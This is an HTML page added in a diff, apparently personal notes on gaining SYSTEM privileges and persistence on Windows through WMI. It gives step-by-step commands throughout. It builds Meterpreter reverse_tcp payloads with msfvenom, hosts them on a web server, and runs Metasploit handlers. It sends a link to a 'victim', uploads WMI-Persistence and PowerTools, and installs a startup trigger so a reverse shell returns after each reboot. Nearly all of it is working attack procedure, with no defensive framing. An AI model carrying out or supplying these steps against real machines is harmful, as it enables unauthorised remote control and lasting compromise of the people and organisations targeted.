@@ -1,0 +1,69 @@
+<html>
+    <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>Privilege Escalation and Maintain Persistence using WMI</h1>
+        <h2>Create malicious files</h2>
+    <ol><p>
+        <ul>sudo su</ul>
+        <ul>
+        <a target=_blank href=https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>msfvenom</a> -p windows/meterpreter/reverse_tcp lhost=[MY IP ADDRESS] lport=444 -f exe > /home/myusername/Desktop/Payload.exe
+    </ul>
+      <ul>
+        <a target=_blank href=https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>msfvenom</a> -p windows/meterpreter/reverse_tcp lhost=[MY IP ADDRESS] lport=444 -f exe > /home/myusername/Desktop/wmi.exe
+    </ul>
+    </p></ol>
+<h2>Host malicious files</h2>
+<p><ol>
+<ul>mkdir /var/www/html/share</ul>
+<ul>chmod -R 755 /var/www/html/share</ul>
+<ul>chown -R www-data:www-data /var/www/html/share</ul>
+<ul>cp /home/myusername/Desktop/Payload.exe /var/www/html/share</ul>
+  <ul>cp /home/myusername/Desktop/wmi.exe /var/www/html/share</ul>
+</ol></p>
+<h2>Start webserver</h2>
+<p><ol><ul>service apache2 start</ul>
+<ul>service nginx start</ul></ol></p>
+<h2>Start Metasploit</h2>
+<p><ol><ul>msfconsole</ul>
+<ul>use exploit/multi/handler</ul>
+<ul>set payload windows/meterpreter/reverse_tcp</ul>
+<ul>set LHOST [MY IP ADDRESS]</ul>
+    <ul>set LPORT 444</ul>
+  <ul>run</ul>
+</ol></p>
+    <h2>Attack</h2>
+<p>Send a link to the victim in order to open the malicious files</p>
+<h2>Meterpreter shell</h2>
+<p><ol><ul>getuid</ul>
+  <ul>upload /home/myusername/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads</ul>
+</ol></p>
+  <h2>Upload <a target=_blank href=https://github.com/PowerShellEmpire/PowerTools>PowerTools</a></h2>
+  <p><ol><ul>upload -r /home/myusername/PowerTools-master C:\\Users\\Administrator\\Downloads</ul>
+  </ol></p>
+    <h2>Powershell</h2>
+    <p><ol><ul>
+        load powershell
+    </ul>
+    <ul>powershell_shell</ul>
+    <ul>Import-Module ./WMI-Persistence.ps1 </ul>
+    <ul>Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”</ul>
+    </ol></p>
+  <h2>Second console</h2>
+  <p><ol<ul>Open a new terminal with root privileges</ul>
+    <ul>msfconsole</ul>
+    <ul>use exploit/multi/handler</ul>
+    <ul>set payload windows/meterpreter/reverse_tcp</ul>
+    <ul>set lhost 10.10.1.13</ul>
+    <ul>set lport 444</ul>
+    <ul>exploit</ul>
+  </ol></p>
+  <h2>First console</h2>
+  <p><ol>
+    <ul>Navigate to the previous console, press CTRL+c and y to exit powershell</ul>
+    <ul>Monitor the second console</ul>
+    <ul>After restart of the Windows system we have system privileges and persistence on the target machine</ul>
+    <ul>Whenever the Windows machine is restarted a session is created</ul>
+    <ul>After restart it will take approximately 5 minutes for the session to open</ul>
+  </ol></p>
+</html>
